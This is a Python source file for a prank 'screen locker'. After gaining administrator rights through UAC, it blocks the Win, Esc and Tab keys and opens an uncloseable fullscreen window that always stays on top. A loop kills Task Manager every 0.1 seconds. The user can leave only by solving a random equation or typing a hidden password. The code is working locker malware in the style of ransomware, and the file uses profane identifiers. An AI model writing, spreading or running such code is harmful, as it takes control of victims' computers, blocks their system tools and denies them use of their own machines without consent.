import random
import threading
import subprocess
import sys
import time
import customtkinter as ctk
import keyboard
import pyautogui
import pyuac
from sympy import symbols, Eq, solve

space = " "

def solve_equation(side_r, side_l):
    x = symbols("x")
    e = Eq(lhs=eval(side_l), rhs=eval(side_r))

    solutions = solve(e, x)
    return solutions

def generate(number_of_terms):

    operations = ['+', '-', '/', '+']
    x_prefix = ['', '-']
    start_str = f'{random.choice(x_prefix)}{random.randint(1, 20)}*x'

    equation = []
    for iterations in range(0, number_of_terms):
        x_probability = 0.10
        x_try = random.randint(0, 100) / 100
        if x_try <= x_probability:  # x in term
            num = random.randint(-10, 10)
            if num < 0:
                num = f'({num}'
            while num == 0:
                num = random.randint(-10, 10)
            term = f'{random.choice(operations)}{space}{num}*x)'
            if iterations == 0:
                term = f'{num}*x)'

            equation.append(term)


        else:
            num = random.randint(-10, 10)
            if num < 0:
                num = f'({num})'
            while num == 0:
                num = random.randint(-10, 10)
            term = f'{random.choice(operations)}{space}{num}'
            if iterations == 0:
                term = f'{num}'

            equation.append(term)

    return start_str, ''.join(equation), f'{start_str.replace("*", "")}{space}={space}{f"{space}".join(equation).replace("*x", "x")}'



# ------------------------------ GUI ------------------------------ #



keyboard.block_key('Win')
keyboard.block_key('Esc')
keyboard.block_key('Tab')
pyautogui.FAILSAFE = False
running = True

def spam_close():
    global running
    while running:
        time.sleep(0.1)
        subprocess.run(["taskkill /F /IM taskmgr.exe"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return


secret = 0
equation = ""
password = "Never Gonna Give You Up"
screen = [1920, 1080]
debug = False
if len(sys.argv) > 1:
    for item in sys.argv:
        if item == "--debug":
            debug = True


wrong_ans = False


def is_admin():
    return pyuac.isUserAdmin()


class GoFuckUrSelf(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.trieslol = ctk.IntVar(value=0)
        self.button_text = ctk.StringVar(value=f'Tries: {self.trieslol.get()}')
        self.title("Just an annoying asf window")
        self.attributes("-fullscreen", True)
        self.configure(bg="#000000", fg_color="#000000", fg="#000000")
        self.protocol("WM_DELETE_WINDOW", self.disable_close)
        self.after(100, self.bring_to_front)
        self.label1 = ctk.CTkLabel(master=self, bg_color="#000000", fg_color="#000000", text_color="#444444", text="Számold ki az x értékét a kilépéhez. \n"
                                                                                                                   "A végeredményt írd le 2 tizedesjegy pontossággal")
        self.label1.place(x=screen[0]/2-278/2, y=screen[1]-58-80)
        self.label2 = ctk.CTkLabel(master=self, bg_color="#000000", fg_color="#000000", text_color="#444444", text=equation, font=('Minecraftia', 16))
        self.label2.place(x=screen[0]/2-((len(equation)*12)/2), y=screen[1]-58-40)
        self.update()
        lwidth = self.label2.winfo_width()
        self.label2.place_forget()
        self.label2.place(x=(screen[0]/2)-(lwidth/2), y=screen[1]-58-40)
        self.passwordbox = ctk.CTkEntry(master=self, width=200, bg_color="#000000", fg_color="#0c0c0c", corner_radius=0, border_color="#000000")
        self.passwordbox.place(x=screen[0]/2-316/2, y=screen[1]-58)
        self.passwordbutton = ctk.CTkButton(master=self, width=100, textvariable=self.button_text, command=self.verify_exit_code, fg_color="#0c0c0c", corner_radius=5, hover_color="#151515")
        self.passwordbutton.place(x=screen[0]/2+50, y=screen[1]-58)
        self.givemeanewshit = ctk.CTkButton(master=self, width=80, text="Új egyenlet", command=self.gen_new_shit, fg_color="#0c0c0c", corner_radius=5, hover_color="#151515")
        self.update()
        self.givemeanewshit.place(x=(screen[0]/2)-(lwidth/2)+lwidth+10, y=screen[1]-58-40)

    def verify_exit_code(self):
        user_input = self.passwordbox.get()
        try:
            print(0, round(float(user_input), 2))
            print(1, round(secret, 2))
            if str(round(float(user_input), 2)) == str(round(secret, 2)):
                self.destroy()
            else:
                curr = self.trieslol.get()
                self.trieslol.set(curr + 1)
                self.button_text.set(f'Tries: {self.trieslol.get()}')
                threading.Thread(target=self.change_bg_color_fail).start()
                self.gen_new_shit()
        except:
            if user_input == password:
                self.destroy()
            else:
                curr = self.trieslol.get()
                self.trieslol.set(curr + 1)
                self.button_text.set(f'Tries: {self.trieslol.get()}')
                threading.Thread(target=self.change_bg_color_fail).start()
                self.gen_new_shit()


    def change_bg_color_fail(self):
        global wrong_ans
        wrong_ans = True
        self.passwordbox.place_forget()
        self.label1.place_forget()
        self.label2.place_forget()
        self.givemeanewshit.place_forget()
        self.passwordbutton.place_forget()
        self.configure(bg="#ff0000", fg_color="#ff0000", fg="#ff0000")
        time.sleep(1)
        self.configure(bg="#000000", fg_color="#000000", fg="#000000")
        self.passwordbox.place(x=screen[0] / 2 - 316 / 2, y=screen[1] - 58)
        self.label1.place(x=screen[0] / 2 - 278 / 2, y=screen[1] - 58 - 80)
        self.label2 = ctk.CTkLabel(master=self, bg_color="#000000", fg_color="#000000", text_color="#444444",
                                   text=equation, font=('Minecraftia', 16))
        self.label2.place(x=screen[0] / 2 - ((len(equation) * 12) / 2), y=screen[1] - 58 - 40)
        self.update()
        lwidth = self.label2.winfo_width()
        self.label2.place_forget()
        self.label2.place(x=(screen[0] / 2) - (lwidth / 2), y=screen[1] - 58 - 40)
        self.passwordbutton.place(x=screen[0] / 2 + 50, y=screen[1] - 58)
        self.update()
        self.givemeanewshit.place(x=(screen[0] / 2) - (lwidth / 2) + lwidth + 10, y=screen[1] - 58 - 40)
        wrong_ans = False
        return


    def disable_close(self):
        pass


    def bring_to_front(self):
        self.lift()
        self.attributes("-topmost", True)
        self.after(100, self.bring_to_front)

    def gen_new_shit(self):
        gen_eq()
        self.label2.configure(text=equation)
        if not wrong_ans:
            self.label2.place_forget()
            self.givemeanewshit.place_forget()
            self.label2.place(x=screen[0] / 2 - ((len(equation) * 12) / 2), y=screen[1] - 58 - 40)
            self.update()
            lwidth = self.label2.winfo_width()
            self.label2.place_forget()
            self.label2.place(x=(screen[0] / 2) - (lwidth / 2), y=screen[1] - 58 - 40)
            self.givemeanewshit.place(x=(screen[0] / 2) - (lwidth / 2) + lwidth + 10, y=screen[1] - 58 - 40)



def gen_eq():
    global secret
    global equation
    try:
        l, r, equation = generate(5)
        secret = (round(solve_equation(l, r)[0], 2))
        #print(secret)
    except:
        gen_eq()




if __name__ == '__main__':
    print('Loading libraries...')
    if is_admin():
        gen_eq()
        threading.Thread(target=spam_close).start()
        app = GoFuckUrSelf()
        app.mainloop()
        keyboard.unblock_key('Win')
        keyboard.unblock_key('Tab')
        keyboard.unblock_key('Esc')
        running = False
    else:
        print("UAC Elevation required! Restarting...")
        pyuac.runAsAdmin()
